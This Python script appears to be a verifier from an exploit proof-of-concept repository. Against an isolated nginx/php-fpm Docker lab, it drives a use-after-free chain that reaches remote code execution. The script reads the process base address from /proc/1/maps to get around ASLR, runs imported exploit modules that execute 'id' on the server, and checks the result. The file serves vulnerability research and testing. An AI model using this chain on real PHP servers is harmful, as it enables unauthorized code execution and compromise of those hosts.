#!/usr/bin/env python3
"""Verifier for fpm_route.py: proves end to end on an isolated nginx -> php-fpm
8.5.x lab that the offset-free unserialize var_hash UAF reaches RCE on php-fpm
given the PIE base. Checks the sink reflects, seeds binbase from the container's
/proc/1/maps, fires `id > <marker>`, reads the marker back (uid=www-data proof),
and confirms the master and a worker survive. Pure stdlib, safe under python3 -I.

Lab bring-up (committed vd24481-8511 profile, 8.5.11-fpm echo-sink, nginx :8186):
    docker compose -f docker-compose.versions.yml --profile vd24481-8511 up -d --build
    python3 -I poc/chains/verify_fpm_route.py \
        --container p2s-vd24481-8511-fpm --host 127.0.0.1 --port 8186
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import universal_remote_rce as remote_rce
import fpm_route as fpm


def _sh(cmd):
    return subprocess.run(cmd, capture_output=True, text=True, timeout=30)


def read_binbase(container):
    """Read the php-fpm PIE base from the container's master (/proc/1/maps).
    Fork-shared ASLR means the master's base == every worker's base, and the
    master never crashes, so this stays valid across worker respawns."""
    r = _sh(["docker", "exec", container, "sh", "-c",
             "grep -m1 /usr/local/sbin/php-fpm /proc/1/maps"])
    line = r.stdout.strip()
    if not line:
        return None
    return int(line.split("-", 1)[0], 16)


def worker_alive(container):
    """Return True if a php-fpm 'pool www' worker process exists."""
    r = _sh(["docker", "exec", container, "sh", "-c",
             'for p in /proc/[0-9]*; do tr "\\0" " " < $p/cmdline 2>/dev/null; '
             'echo; done'])
    return "pool www" in r.stdout


def main(argv=None):
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", default="p2s-vd24481-8511-fpm",
                    help="fpm container name (for /proc binbase + marker read)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8186)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--sink", choices=["cook", "enum"], default="cook")
    ap.add_argument("--binbase", default=None, help="hex; else read from /proc")
    ap.add_argument("--marker", default="/dev/shm/v")  # "id>/dev/shm/v" = 13B
    ap.add_argument("--attempts", type=int, default=8)
    ap.add_argument("--runs", type=int, default=1,
                    help="repeat the chain N times for a reliability count")
    args = ap.parse_args(argv)

    # binbase
    if args.binbase:
        binbase = int(args.binbase, 16)
    else:
        binbase = read_binbase(args.container)
        if binbase is None:
            print("FAIL: could not read binbase from", args.container)
            return 2
    print(f"[verify] binbase = 0x{binbase:x} (from "
          f"{'cli' if args.binbase else '/proc/1/maps'})")

    if not worker_alive(args.container):
        print("FAIL: no php-fpm worker before run")
        return 2

    cmd = f"id>{args.marker}"
    if len(cmd) > 14:
        print(f"FAIL: marker cmd {cmd!r} exceeds 14-byte cap")
        return 2

    passes = 0
    for run in range(1, args.runs + 1):
        _sh(["docker", "exec", args.container, "sh", "-c", f"rm -f {args.marker}"])
        remote_rce.req_count = 0
        remote_rce.crash_count = 0
        fpm.install_fpm_patches(args.host, args.port, args.path, binbase,
                                enum=(args.sink == "enum"))
        if run == 1 and not fpm.preflight_reflect(args.host, args.port, args.path):
            print("FAIL: sink preflight failed")
            return 2
        t0 = time.time()
        ok, stats = fpm.run_fpm_chain(args.host, args.port, args.path, binbase,
                                      cmd, chunk=None, attempts=args.attempts)
        dt = time.time() - t0
        time.sleep(0.4)
        mk = _sh(["docker", "exec", args.container, "sh", "-c",
                  f"cat {args.marker} 2>/dev/null"]).stdout.strip()
        alive = worker_alive(args.container)
        got_uid = "uid=" in mk
        ok_run = bool(got_uid and alive)
        passes += ok_run
        print(f"[verify] run {run}/{args.runs}: fire={ok} "
              f"reqs={stats.get('total_reqs')} "
              f"crashes={stats.get('total_crashes')} {dt:.1f}s")
        print(f"         marker={mk!r}")
        print(f"         worker_alive={alive}  -> {'PASS' if ok_run else 'FAIL'}")

    print("\n" + "=" * 60)
    print(f"[verify] {passes}/{args.runs} runs reached RCE (uid via marker) "
          f"with the fpm worker still alive.")
    return 0 if passes else 1


if __name__ == "__main__":
    sys.exit(main())
